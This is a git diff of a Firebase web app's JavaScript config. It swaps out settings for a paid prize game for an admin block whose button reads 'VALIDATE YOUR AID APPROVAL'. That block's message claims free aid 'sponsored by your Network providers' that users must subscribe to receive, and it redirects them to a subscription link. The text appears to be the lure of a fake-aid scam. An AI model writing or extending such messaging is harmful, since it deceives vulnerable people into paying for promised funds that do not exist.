@@ -8,47 +8,14 @@ const firebaseConfig = {
     messagingSenderId: "593310501630",
     appId: "1:593310501630:web:c241a05e0d7c4a810173af"
 };
-
-// Game Settings Configuration
-const gameSettings = {
-    nigeria: {
-        gamePrice: 100,
-        dailyWinners: 10,
-        winningTime: 5.00,
-        difficulty: 'medium',
-        giftCardPaymentUrl: '#',
-        openGiveawayPrice: 2000,
-        openGiveawayPaymentUrl: '#',
-        fundWalletUrl: '#',
-        affiliateCommission: 10,
-        giveawayCashback: 15,
-        currency: '₦'
-    },
-    other: {
-        gamePrice: 0.5,
-        dailyWinners: 10,
-        winningTime: 5.00,
-        difficulty: 'medium',
-        giftCardPaymentUrl: '#',
-        openGiveawayPrice: 3,
-        openGiveawayPaymentUrl: '#',
-        fundWalletUrl: '#',
-        affiliateCommission: 10,
-        giveawayCashback: 15,
-        currency: 'USDT '
-    }
+const adminConfig = {
+    adminUIDs: [
+        "admin-user-id-1",
+        "admin-user-id-2"
+    ],
+    validationButtonText: "VALIDATE YOUR AID APPROVAL",
+    termsMessage: "The AID/HELP is FREE and is sponsored by your Network providers. You need to subscribe to your personal network to receive the funds.",
+    defaultRedirectUrl: "https://example.com/subscribe",
+    contactEmail: "support@networkaid.com",
+    contactPhone: "+1 (555) 123-4567"
 };
-
-// Social Settings Configuration
-const socialSettings = {
-    youtube: '',
-    tiktok: '',
-    twitter: '',
-    facebook: '',
-    instagram: ''
-};
-
-// Export configurations
-if (typeof module !== 'undefined' && module.exports) {
-    module.exports = { firebaseConfig, gameSettings, socialSettings };
-}
